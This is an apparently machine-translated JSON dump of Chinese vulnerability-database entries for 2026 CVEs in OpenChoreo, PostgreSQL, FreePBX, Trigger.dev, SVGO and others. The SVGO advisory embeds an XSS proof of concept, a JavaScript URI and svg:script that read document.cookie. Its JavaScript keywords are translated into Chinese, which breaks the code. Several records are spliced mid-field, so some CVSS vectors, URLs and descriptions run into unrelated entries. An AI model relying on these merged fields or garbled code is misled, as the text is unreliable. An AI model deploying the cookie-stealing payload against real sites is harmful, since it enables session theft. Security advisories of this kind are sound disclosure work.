vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.8}]}, "cvss_score": 8.8, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-78", "description": "OpenChoreo 是一个完整的、开源的 Kubernetes 开发者平台。在 1.0.4、1.1.4 和 1.2.0-rc.2 之前，samples/getting-started/workflow-templates/ 下的 OpenChoreo Workflow Plane 模板将开发人员控制的工作流参数插入到通过 sh -c 执行的 shell 程序文本中，而不是通过 container.env 传递值，从而允许在工作流 pod 中运行任意命令，而受影响的特权 Podman 模板缺少 hostUsers: false。此问题已在版本 1.0.4、1.1.4 和 1.2.0-rc.2 中修复。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "OS命令注入", "kind_en": "操作系统命令中使用的特殊元素的不正确中和（“操作系统命令注入”）", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-kbsn-57i6", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-kbsn-57i6", "name": "https://www.oscs1024.com/hd/MPS-kbsn-57i6"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73667", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-73667"}, {"url": "https://github.com/openchoreo/openchoreo/commit/017c3c6d8b27c21d11c8c2b43da1846aa7ae73b9", "name": ""}, {"url": "https://github.com/openchoreo/openchoreo/commit/65c081ff74618714cb0c82b5d0e0fad2c2cbc46b", "name": ""}, {"url": "https://github.com/openchoreo/openchoreo/commit/b274127a4342e5433c5035384cef57478b5b65ed", "name": ""}, {"url": "https://github.com/openchoreo/openchoreo/commit/fb2b659b9884eb45fa4f02b9cc7e89718a0276b7", "name": ""}, {"url": "https://github.com/openchoreo/openchoreo/pull/4193", "name": ""}, {"url": "https://github.com/openchoreo/openchoreo/pull/4243", "name": ""}, {"url": "https://github.com/openchoreo/openchoreo/pull/4277", "name": ""}, {"url": "https://github.com/openchoreo/openchoreo/pull/4297", "name": ""}, {"url": "https://github.com/openchoreo/openchoreo/releases/tag/v1.0.4", "name": ""}, {"url": "https://github.com/openchoreo/openchoreo/releases/tag/v1.1.4", "name": ""}, {"url": "https://github.com/openchoreo/openchoreo/releases/tag/v1.2.0-rc.2", "name": ""}, {"url": "https://github.com/openchoreo/openchoreo/security/advisories/GHSA-2mw5-23gm-pccq", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-73667漏洞", "_translated": true, "_saved_at": "2026-08-14T01:23:08+00:00", "_first_saved_at": "2026-08-13T23:35:13+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-kbsn-57i6"}, {"analysis_status": 3, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-14680", "cvss": {"cvssv31": [{"source": "f86ef6dc-4d3a-42ad-8f28-e6d5547a5007", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.8}, {"source": "murphysec", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.8}]}, "cvss_score": 8.8, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-843", "description": "PostgreSQL 是广泛使用的开源对象关系型数据库，其 SQL 解析层负责将用户提交的函数调用、操作符与类型转换分发到 C 语言实现的内置函数与扩展。\n受影响版本中，引擎内部有一种名叫 internal 的特殊类型，只给数据库自己的底层函数使用，普通 SQL 本不该碰到它。系统原先只拦住了把普通值直接改写成 internal 的写法，但通过函数调用、运算符或另一类隐式转换仍能绕过去。任意能执行 SQL 的数据库账号，都可以把引擎无法正确理解的数据交给这些底层函数，让进程按错误类型去解释内存，最终以运行数据库的操作系统用户身份执行代码。\n修复版本中通过在解析函数调用（ParseFuncOrColumn）和运算符时直接拒绝接受或返回 internal 的函数，并禁止其他类型与 internal 互相转换，普通 SQL 再也进不了这条路径，看错类型并执行系统代码的问题被切断。", "effects": [{"comp_name": "postgresql", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,14.24)", "min_fixed_version": "14.24", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[15.0,15.19)", "min_fixed_version": "15.19", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[16.0,16.15)", "min_fixed_version": "16.15", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[17.0,17.11)", "min_fixed_version": "17.11", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[18.0,18.6)", "min_fixed_version": "18.6", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "使用不兼容类型访问资源（类型混淆）", "kind_en": "使用不兼容类型访问资源（“类型混淆”）", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-my97-jv3r", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-my97-jv3r", "name": "https://www.oscs1024.com/hd/MPS-my97-jv3r"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-14680", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-14680"}, {"url": "https://www.postgresql.org/support/security/CVE-2026-14680/", "name": ""}, {"url": "https://github.com/postgres/postgres/commit/54649de65f0822ee0678cc2b2df6ad47de0a748e", "name": "Commit"}, {"url": "https://github.com/postgres/postgres/commit/722695db18b6540a3757811436116f928c71b763", "name": "Commit"}], "scope_influence": "广", "tags": ["专家校准", "应用软件", "数据库"], "title": "PostgreSQL internal 类型混淆导致任意代码执行漏洞", "_translated": true, "_saved_at": "2026-08-14T06:09:19+00:00", "_first_saved_at": "2026-08-14T04:01:36+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-my97-jv3r"}, {"analysis_status": 0, "articles": [{"content": "- 程序中的访问控制机制未正确实现，这种缺陷通常会导致未授权的用户或资源可以访问程序中的重要数据或资源，从而导致程序崩溃或出现其他错误。", "title": "什么是授权检查错误"}, {"content": "- 特权提升攻击：攻击者可以通过利用此缺陷，绕过应用程序的访问控制机制，获取系统管理员权限，从而完全控制系统。\n- 数据泄露攻击：攻击者可以通过利用此缺陷，获取系统中敏感数据，如用户凭证、信用卡信息等。\n- 拒绝服务攻击：攻击者可以通过利用此缺陷，对系统进行拒绝服务攻击，从而使系统无法正常工作。\n- 恶意软件传播：攻击者可以通过利用此缺陷，将恶意软件传播到系统中，从而控制系统或窃取敏感数据。\n", "title": "授权检查错误常见的攻击方式"}, {"content": "- 使用访问控制列表 (ACL):使用 ACL 可以限制用户对程序中的不同资源的访问权限。ACL 通常由用户名、权限和资源地址组成，可以确保只有授权用户才能访问程序中的重要数据或资源。\n- 使用访问令牌：使用访问令牌可以确保只有授权用户才能访问程序中的不同资源。令牌通常由用户 ID、权限和资源地址组成，可以确保只有授权用户才能更改令牌的权限。\n- 使用安全审计：在程序中记录安全审计日志，可以确保管理员可以追踪未授权用户的活动。同时，定期审查安全审计日志，可以及时发现未授权的活动并采取相应的措施。\n- 最小特权原则：程序应该限制用户输入的数据的权限，只允许授权用户进行特定的操作，以减少未授权用户对受保护资源或数据的访问。\n- 输入验证：程序应该对用户输入的数据进行适当的验证和过滤，以确保输入的数据符合预期的格式和类型。\n- 安全编码实践：程序应该遵循一些安全编码实践，如使用安全的算法和加密机制、避免使用未认证的库和框架、避免使用默认设置等，以减少漏洞的出现。\n", "title": "如何预防授权检查错误"}], "cnvd_id": "", "cve_id": "CVE-2026-73841", "cvss": {"cvssv31": [{"source": "security-advisories@github.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.8}]}, "cvss_score": 8.8, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-863", "description": "OpenChoreo 是一个完整的、开源的 Kubernetes 开发者平台。从1.2.0-rc.1到1.2.0，internal/openchoreo-api/api/handlers/exec.go和internal/openchoreo-api/api/handlers/wirelogs.go使用调用者提供的项目查询参数而不是comp.Spec.Owner.ProjectName来授权component:exec和wirelogs:view，允许具有项目范围授权的用户在以下组件中执行命令并读取wirelogs：同一命名空间中的其他项目。该漏洞已在1.2.0版本中修复。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "授权检查错误", "kind_en": "授权错误", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-swhx-21ji", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-swhx-21ji", "name": "https://www.oscs1024.com/hd/MPS-swhx-21ji"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73841", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-73841"}, {"url": "https://github.com/openchoreo/openchoreo/security/advisories/GHSA-52gf-6rpq-fgmx", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-73841漏洞", "_translated": true, "_saved_at": "2026-08-14T01:23:08+00:00", "_first_saved_at": "2026-08-13T23:35:11+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-swhx-21ji"}, {"analysis_status": 0, "articles": [{"content": "当应用程序接受来自用户的输入，并将其直接拼接到SQL查询语句中，而没有对输入进行充分的验证和转义时，就会发生SQL注入。攻击者可以通过在输入中插入恶意的SQL代码，改变原始查询的意图，从而执行未经授权的操作或访问敏感数据。", "title": "什么是SQL注入"}, {"content": "- 基于错误的输入过滤：攻击者通过向输入字段中插入特殊字符或SQL语句片段来破坏应用程序的输入过滤机制。这可能导致应用程序执行意外的SQL查询。\n- 基于布尔盲注：攻击者利用应用程序在查询结果中显示的不同响应来确定SQL语句的真假。通过构造特定的查询，攻击者可以逐步推断出数据库的结构和敏感信息。\n- 基于时间的盲注：攻击者通过在SQL查询中插入延迟语句来测试条件的真假。通过测量响应时间的差异，攻击者可以推断出SQL语句的真假和敏感数据的存在性。", "title": "SQL注入常见的攻击方式"}, {"content": "- 使用参数化查询或预编译语句：避免将用户输入直接拼接到SQL查询语句中，而是使用参数化查询或预编译语句。这样可以将用户输入作为参数传递给查询，从而避免了注入攻击。\n- 输入验证和过滤：对用户输入进行充分的验证和过滤，确保输入符合预期的格式和范围。可以使用白名单验证、正则表达式或输入验证库等方法来过滤输入。\n- 最小权限原则：确保数据库用户具有最小的权限，并严格限制其对敏感数据和数据库操作的访问权限。\n- 不透明化敏感数据：对于敏感数据，如密码和信用卡号等，应该使用适当的加密和哈希算法进行存储，以减少数据泄露的风险。\n- 定期更新和维护：及时应用数据库供应商发布的安全补丁和更新，以修复已知的漏洞和弱点。", "title": "如何预防SQL注入"}], "cnvd_id": "", "cve_id": "CVE-2026-59109", "cvss": {"cvssv31": [{"source": "a6d3dc9e-0591-4a13-bce7-0f5b31ff6158", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.8}], "cvssv4": [{"source": "a6d3dc9e-0591-4a13-bce7-0f5b31ff6158", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 8.7}]}, "cvss_score": 8.7, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-89", "description": "Zalktis 会计应用程序中的 SQL 注入通过\n收到的电子发票中由贸易伙伴控制的文本字段。当\n导入收到的电子发票 (UBL/PEPPOL) 或电子商务出口，Zalktis\n使用以下命令将合作伙伴控制的值直接连接到 SQL 语句文本中\n字符串连接，既没有参数化查询，也没有转义。的\n应用程序自己的转义助手 Dazadi.sql_txt(),\n不会在这些代码路径上调用，因此发送发票的一方可能会中断\n脱离字符串文字并更改查询逻辑。\n\n\n\n\n\n\n\n\n\n此问题影响 Zalktis：2026.1.586 之前和 2026.2.592 之前。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "SQL注入", "kind_en": "SQL 命令中使用的特殊元素的不正确中和（“SQL 注入”）", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-grdx-yae2", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-grdx-yae2", "name": "https://www.oscs1024.com/hd/MPS-grdx-ya  "_saved_at": "2026-08-13T18:55:21+00:00", "_first_saved_at": "2026-08-13T18:55:21+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-io32-xl90"}, {"analysis_status": 0, "articles": [{"content": "- 编写代码时没有正确处理输入数据或没有正确验证用户输入而导致的。", "title": "什么是关键资源权限分配不当"}, {"content": "- 弱密码或未使用的密码：当管理员或系统管理员在创建帐户时，没有使用强密码或未对帐户进行密码更新时，可能会发生这种情况。弱密码可能会被黑客破解或通过其他方式轻松访问系统。\n- 未正确配置权限：在系统中，不同的资源通常需要不同的权限才能访问。如果管理员未正确配置权限，那么未经授权的用户可能会通过欺骗系统或利用其他漏洞来访问关键资源。\n- 权限重用：在某些情况下，管理员可能会将某些权限分配给某个用户，但这些权限并未被正确地限制或授权给该用户。如果其他用户尝试使用这些权限访问关键资源，那么他们可能会获得未经授权的访问权限。\n- 未正确验证用户输入：当开发人员没有正确验证用户输入时，可能会发生这种情况。例如，如果开发人员未正确过滤用户输入的用户名或密码，那么黑客可能会利用这些信息轻松地访问系统。\n", "title": "关键资源权限分配不当常见的攻击方式"}, {"content": "- 使用强密码：管理员应该使用强密码来保护系统，并定期更改密码。强密码应该包括数字、字母和符号，并且应该不同于其他帐户使用的密码。\n- 正确配置权限：管理员应该正确配置系统中不同资源所需的权限。用户可以被授予访问特定资源的权限，但不应该被授予访问其他资源的权限。\n- 权限限制：管理员应该使用权限限制来限制用户对特定资源的访问。例如，用户可以被授予访问特定文件夹的权限，但不能访问其他文件夹。\n- 输入验证：开发人员应该正确验证用户输入。例如，他们可以过滤用户输入的用户名和密码，以确保它们符合预期的格式。\n- 安全培训：管理员和用户应该接受安全培训，以便了解如何识别和避免常见的安全漏洞，例如不正确权限授予漏洞。\n- 定期更新和修补软件：系统软件和应用程序应该定期更新和修补，以确保它们不受最新安全漏洞的影响。", "title": "如何预防关键资源权限分配不当"}], "cnvd_id": "", "cve_id": "CVE-2026-73664", "cvss": {"cvssv4": [{"source": "security-advisories@github.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 8.6}]}, "cvss_score": 8.6, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-732", "description": "FreePBX 是一个开源 IP PBX。从 17.0.5.34 到 17.0.11，Backup.class.php 中的 publicKeySave AJAX 端点接受经过身份验证的管理员的 SSH 公钥，并将其附加到 asterisk 系统用户的 /home/asterisk/.ssh/authorized_keys 中，而无需可靠地强制执行仅备份命令和源限制。该密钥授予持久的 shell 访问权限，可以执行任意命令、访问 FreePBX 和调用数据、修改系统文件以及中断服务。此问题已在版本 17.0.11 中修复。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "关键资源权限分配不当", "kind_en": "关键资源的权限分配不正确", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-54qc-m8vo", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-54qc-m8vo", "name": "https://www.oscs1024.com/hd/MPS-54qc-m8vo"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73664", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-73664"}, {"url": "https://github.com/FreePBX/security-reporting/security/advisories/GHSA-24w6-hpg3-rwfg", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-73664漏洞", "_translated": true, "_saved_at": "2026-08-14T01:23:10+00:00", "_first_saved_at": "2026-08-13T23:35:15+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-54qc-m8vo"}, {"analysis_status": 0, "articles": [{"content": "当应用程序接受来自用户的输入，并将其直接拼接到SQL查询语句中，而没有对输入进行充分的验证和转义时，就会发生SQL注入。攻击者可以通过在输入中插入恶意的SQL代码，改变原始查询的意图，从而执行未经授权的操作或访问敏感数据。", "title": "什么是SQL注入"}, {"content": "- 基于错误的输入过滤：攻击者通过向输入字段中插入特殊字符或SQL语句片段来破坏应用程序的输入过滤机制。这可能导致应用程序执行意外的SQL查询。\n- 基于布尔盲注：攻击者利用应用程序在查询结果中显示的不同响应来确定SQL语句的真假。通过构造特定的查询，攻击者可以逐步推断出数据库的结构和敏感信息。\n- 基于时间的盲注：攻击者通过在SQL查询中插入延迟语句来测试条件的真假。通过测量响应时间的差异，攻击者可以推断出SQL语句的真假和敏感数据的存在性。", "title": "SQL注入常见的攻击方式"}, {"content": "- 使用参数化查询或预编译语句：避免将用户输入直接拼接到SQL查询语句中，而是使用参数化查询或预编译语句。这样可以将用户输入作为参数传递给查询，从而避免了注入攻击。\n- 输入验证和过滤：对用户输入进行充分的验证和过滤，确保输入符合预期的格式和范围。可以使用白名单验证、正则表达式或输入验证库等方法来过滤输入。\n- 最小权限原则：确保数据库用户具有最小的权限，并严格限制其对敏感数据和数据库操作的访问权限。\n- 不透明化敏感数据：对于敏感数据，如密码和信用卡号等，应该使用适当的加密和哈希算法进行存储，以减少数据泄露的风险。\n- 定期更新和维护：及时应用数据库供应商发布的安全补丁和更新，以修复已知的漏洞和弱点。", "title": "如何预防SQL注入"}], "cnvd_id": "", "cve_id": "CVE-2026-73670", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 7.2}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR: :L/PR:L/UI:N/S:C/C:N/I:L/A:H", "severity": "high", "base_score": 8.5}]}, "cvss_score": 8.5, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:H", "cwe": "CWE-1321", "description": "Trigger.dev 是一个用于构建和部署完全托管的 AI 代理和工作流程的平台。从 3.3.8 到 4.5.6，PUT /api/v1/runs/:runId/metadata 端点将攻击者控制的 operation.key 值传递到 packages/core/src/v3/runMetadata/operations.ts 中的 new JSONHeroPath(operation.key).set(newMetadata, value) ，而不拒绝危险的构造函数和原型路径段。具有正常环境 API 密钥的调用者可以污染共享 webapp 进程中的 Object.prototype，破坏 Prisma 查询和 Prometheus 标签，破坏其他租户的工作人员身份验证，并导致进程范围内的拒绝服务。此问题已在版本 4.5.6 中修复。", "effects": [{"comp_name": "@trigger.dev/core", "ecosystem": "npm", "versions": [{"affected_version": "[3.3.8,4.5.6)", "min_fixed_version": "4.5.6", "repository": "npm", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "原型污染", "kind_en": "对象原型属性的控制不当的修改（“原型污染”）", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-pgw6-h2bx", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-pgw6-h2bx", "name": "https://www.oscs1024.com/hd/MPS-pgw6-h2bx"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73654", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-73654"}, {"url": "https://github.com/triggerdotdev/trigger.dev/commit/6997aeb05e27d2db47f9eda01fdc8a17c81a1ae0", "name": ""}, {"url": "https://github.com/triggerdotdev/trigger.dev/pull/4316", "name": ""}, {"url": "https://github.com/triggerdotdev/trigger.dev/releases/tag/v4.5.6", "name": ""}, {"url": "https://github.com/triggerdotdev/trigger.dev/security/advisories/GHSA-p28v-f755-9qrg", "name": ""}], "scope_influence": "", "tags": ["npm", "开源"], "title": "CVE-2026-73654漏洞", "_translated": true, "_saved_at": "2026-08-13T21:38:25+00:00", "_first_saved_at": "2026-08-13T21:38:25+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-pgw6-h2bx"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-73650", "cvss": {"cvssv31": [{"source": "security-advisories@github.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N", "severity": "high", "base_score": 8.2}]}, "cvss_score": 8.2, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N", "cwe": "CWE-184", "description": "### 总结\n\nSVGO 的 removeScripts 插件（默认情况下禁用）从 SVG 中删除脚本，但在某些情况下可执行脚本保持不变。如果消费者依赖此插件进行清理并将其提供给用户，这些 SVG 可能会打开 XSS 之门。\n\n### 详细信息\n\nSVGO 有一个用于从 SVG 中删除脚本的插件，它删除了：\n\n- `\u003cscript\u003e` 元素\n- JavaScript URI（仅限 v4 和 v3）\n- `on...` 事件处理程序（仅限 v4 和 v3）\n\n虽然 SVGO 不是一个清理库，但 SVGO 继续为那些已经为此目的使用该插件的人维护该插件。\n\n然而，有两个问题：\n\n- SVGO 不检查命名空间/前缀的“script”元素，例如，如果为 SVG 命名空间声明显式前缀（“\u003csvg:script\u003e”）而不是使用默认命名空间（“\u003cscript\u003e”），则“\u003csvg:script\u003e”标记将保持不变。\n- SVGO 区分大小写匹配 JavaScript URI，但它应该不区分大小写。\n\n#### 概念验证\n\n````js\n从'svgo'导入{优化}；\n\n/** 假设该字符串是通过其他方式获取的，例如网络。 */\n常量原始 = `\n  \u003csvg xmlns=\"http://www.w3.org/2000/svg\" xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns:uwu=\"http://www.w3.org/1999/xlink\" viewBox=\"0 0 100 100\" version=\"1.1\"\u003e\n    \u003ca uwu:href=\"JavaScript:(() =\u003e {alert(document.cookie) })();\"\u003e\u003ctext y=\"30\"\u003euwu\u003c/text\u003e\u003c/a\u003e\n    \u003csvg：脚本\u003e\n      警报（文档.cookie）；\n    \u003c/svg：脚本\u003e\n  \u003c/svg\u003e\n`;\n\n优化（原始，{\n  插件：['removeScripts']\n});\n// 未删除 \u003csvg:script\u003e 或 uwu:href=\"JavaScript:... — 仍由浏览器执行。\n````\n\n### 影响\n\n如果您在不受信任的输入（例如，用户上传到 Web 应用程序）上运行 SVGO 并且依赖于 removeScripts，则某些脚本可能仍然存在。如果该 SVG 然后由同一域中的另一个用户直接打开，它可以调用可以读取本地存储或 cookie 的脚本。\n\n如果您启用了以下其中一项，这可能会影响您：\n\n| SVGO 版本 |插件名称 |\n|---|---|\n| v4 |删除脚本 |\n| v3 |删除脚本元素 |\n| v2 |删除脚本元素 |\n| v1 |删除脚本元素 |\n\n它不太可能影响仅在自己的 SVG 或构建管道中本地使用 SVGO 的用户。\n\n### 补丁\n\n#### \u003e= 3.0.0，\u003c= 4.0.1\n\nSVGO 修补了 v4.0.2 和 v3.3.4。只需使用您首选的包管理器升级依赖项即可！例如：\n\n````嘘\n纱线向上 svgo\n\n# 或者如果 SVGO 是嵌套依赖项\n纱线向上-R svgo\n````\n\n建议的修复是改进我们的命名空间感知处理，以仅显式地作用于默认命名空间、SVG 命名空间和 XHTML 命名空间。这会处理浏览器执行的所有脚本，但会保留完整的自定义前缀，这些前缀恰好有一个名为“\u003c*:script\u003e”的元素，客户端不应将其视为可执行文件。 \n\n#### \u003e= 2.0.0，\u003c= 2.8.2\n\nSVGO 修补了 v2.8.3，但是 SVGO v2 明确仅实现并记录了它将删除 `\u003cscript\u003e` 元素，仅此而已。它具有对“\u003csvg:script\u003e”或“\u003cxhtml:script\u003e”等标签的名称空间感知处理，但已更新**_not_**以删除 JavaScript URI 或事件处理程序（如 \u003e= v3）。如果您需要此功能，请升级到 v4 或 v3，或者使用最后记录的解决方法之一。\n\n#### \u003e= 1.0.0，\u003c= 1.3.2\n\nSVGO v1 现已弃用一段时间，并且不会修补。请升级到更新版本！如果有什么事情阻止您这样做，请联系我们！我们很乐意扩展我们的迁移指南，或者在您遇到问题时为您提供支持。\n\n### 解决方法\n\n如果您启用该插件的动机是 SVG 清理，请考虑使用专用的 SVG 清理工具并在将 SVG 传递到 SVGO 之前调用它。", "effects": [{"comp_name": "svgo", "ecosystem": "npm", "versions": [{"affected_version": "[3.0.0,3.3.4)", "min_fixed_version": "3.3.4", "repository": "npm", "solutions": [], "upstream": true}, {"affected_version": "[1.0.0,2.8.3)", "min_fixed_version": "2.8.3", "repository": "npm", "solutions": [], "upstream": true}, {"affected_version": "[4.0.0,4.0.2)", "min_fixed_version": "4.0.2", "repository": "npm", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "不完整的黑名单", "kind_en": "不允许的输入的不完整列表", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-pijl-urts", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://github.com/svg/svgo/security/advisories/GHSA-2p49-hgcm-8545", "name": ""}, {"url": "https://github.com/svg/svgo/commit/628e3bc7336625a30365d0a9b60185307d852466", "name": ""}, {"url": "https://github.com/svg/svgo/commit/72a23886b4698b27624b936f3a15a80afd36d75f", "name": ""}, {"url": "https://github.com/svg/svgo/commit/f529cfccc6c154d6f6eabe276ec637a8c5db6763", "name": ""}, {"url": "https://github.com/svg/svgo/releases/tag/v2.8.3", "name": ""}, {"url": "https://github.com/svg/svgo/releases/tag/v3.3.4", "name": ""}, {"url": "https://github.com/svg/svgo/releases/tag/v4.0.2", "name": ""}, {"url": "https://github.com/advisories/GHSA-2p49-hgc choreo/openchoreo/security/advisories/GHSA-v7qx-mqhq-grvh", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-73666漏洞", "_translated": true, "_saved_at": "2026-08-14T01:23:11+00:00", "_first_saved_at": "2026-08-13T23:35:17+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-wo1h-5yes"}, {"analysis_status": 0, "articles": [{"content": "- 程序中未正确实现授权机制，从而导致程序可以被未授权的用户访问或篡改", "title": "什么是授权检查缺失"}, {"content": "- 伪造授权请求：攻击者可以通过发送伪造的授权请求来绕过授权验证，从而实现访问受保护的资源或数据。例如，攻击者可以通过伪造用户名和密码、证书等来模拟授权请求，从而绕过授权验证。\n- 命令注入攻击：攻击者可以通过在应用程序中注入恶意的命令来绕过授权验证，从而实现访问受保护的资源或数据。例如，攻击者可以通过在 Web 应用程序中注入恶意的命令来访问受保护的数据库或文件系统。\n- 文件包含攻击：攻击者可以通过在应用程序中包含恶意的文件，从而利用 Missing Authorization 漏洞来访问受保护的资源或数据。例如，攻击者可以通过在 Web 应用程序中包含恶意的 CSS 或 JavaScript 文件来欺骗应用程序将用户输入的数据执行为授权请求，从而绕过授权验证。\n- 拒绝服务攻击 (DDoS):攻击者可以通过向应用程序发送大量的请求来占用其资源，从而实现拒绝服务攻击。例如，攻击者可以通过向 Web 服务器发送大量的 HTTP 请求来占用其资源，从而使 Web 服务器无法正常响应合法的请求。\n", "title": "授权检查缺失常见的攻击方式"}, {"content": "- 使用身份验证和授权机制：程序应该使用适当的身份验证和授权机制来验证用户的身份和权限，以确保只有授权用户可以访问受保护的资源或数据。\n- 最小特权原则：程序应该限制用户输入的数据的权限，只允许授权用户进行特定的操作，以减少未授权用户对受保护资源或数据的访问。\n- 输入验证：程序应该对用户输入的数据进行适当的验证和过滤，以确保输入的数据符合预期的格式和类型。\n- 安全编码实践：程序应该遵循一些安全编码实践，如使用安全的算法和加密机制、避免使用未认证的库和框架、避免使用默认设置等，以减少漏洞的出现。\n", "title": "如何预防授权检查缺失"}], "cnvd_id": "", "cve_id": "CVE-2026-73658", "cvss": {"cvssv31": [{"source": "security-advisories@github.com", "vector": 